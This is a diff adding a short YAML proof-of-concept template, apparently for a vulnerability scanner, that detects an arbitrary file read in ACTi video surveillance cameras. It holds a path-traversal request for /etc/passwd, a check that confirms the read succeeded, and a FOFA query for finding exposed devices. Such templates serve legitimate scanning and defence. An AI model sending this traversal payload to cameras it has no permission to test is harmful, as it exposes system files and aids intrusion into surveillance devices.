@@ -1,0 +1,15 @@
+id: poc-yaml-acti-video-surveillance-images-anyfile-read
+info:
+  name: ACTI 视频监控 images 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: ACTI摄像头
+  fofa: app="ACTi-视频监控"
+requests:
+- method: GET
+  path: /images/../../../../../../../../etc/passwd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<") && contains(content_type,"application/octet-stream")
+variables: {}
+transport: http
